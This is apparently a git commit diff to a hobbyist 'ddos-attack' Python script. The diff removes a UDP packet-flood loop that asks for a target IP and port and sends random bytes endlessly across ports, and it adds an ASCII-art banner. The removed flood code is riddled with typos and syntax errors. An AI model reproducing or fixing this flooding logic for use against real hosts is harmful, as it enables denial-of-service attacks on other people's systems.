b105ce04a243c9235ceabf32aa6769f2903c2f6e
BLACKCØDER <69689969+BLCKCODERR@users.noreply.github.com>
2020-10-01 08:35:55 -0300

    Update ddos-attack

--- ddos-attack-unk.py
+++ ddos-attack-unk.py
@@ -1,38 +1,15 @@
+import socket
 import sys
 import os
-import time
-import socket
-import random
-import ipadress
 
-
-
-#botnet ddos-attack
-##########
-sock = socket.socket(socket.AF_INET, socket.SOCK_DEGRAM)
-bytes = random._urandom(1490)
-#########
-
-
-
-def main( ):
-    os.system("clear")
-    os.system("figlet DDos Attack")
-    print
-    print ("Author: UNK\nReview:koda")
-    print
-    vitima = (input("IP Target :  "))
-    port = int(input("Port :    ")) 
-    os.system("clear") 
-    ip = int(input(ipadress.  ip_adress(vitima))
-    sent = 0
-
-
-
-while True:
-    sock.sendto(bytes, (ip, port))
-    sent = sent + 1
-    port = port + 1
-    print ("sent {sent} packet to {ip}    throught port:{port}")
-    if    port == 65534:
-	      port = 1
+main = """
+ / $$$$$$$ / $$$$$$$ / $$$$$$ / $$ / $$ / $$      
+| $$ __ $$ | $$ __ $$ / $$ __ $$ | $$ | $$ | $$      
+| $$ \ $$ | $$ \ $$ / $$$$$$ / $$$$$$$ | $$ \ $$ / $$$$$$ / $$$$$$ / $$$$$$ / $$$$$$$ | $$ / $$
+| $$ | $$ | $$ | $$ / $$ __ $$ / $$ _____ // $$$$$$ | $$$$$$$$ | _ $$ _ / | _ $$ _ / | ____ $$ / $$ _____ / | $$ / $$ /
+| $$ | $$ | $$ | $$ | $$ \ $$ | $$$$$$ | ______ / | $$ __ $$ | $$ | $$ / $$$$$$$ | $$ | $$$$$$ /
+| $$ | $$ | $$ | $$ | $$ | $$ \ ____ $$ | $$ | $$ | $$ / $$ | $$ / $$ / $$ __ $$ | $$ | $$ _ $$
+| $$$$$$$ / | $$$$$$$ / | $$$$$$ / / $$$$$$$ / | $$ | $$ | $$$$ / | $$$$ / | $$$$$$$ | $$$$$$$ | $$ \ $$
+| _______ / | _______ / \ ______ / | _______ / | __ / | __ / \ ___ / \ ___ / \ _______ / \ _______ / | ___
+powred by: ch33ch/blackcøder/unk ...\n\n                                                                                     
+                                                                                                         
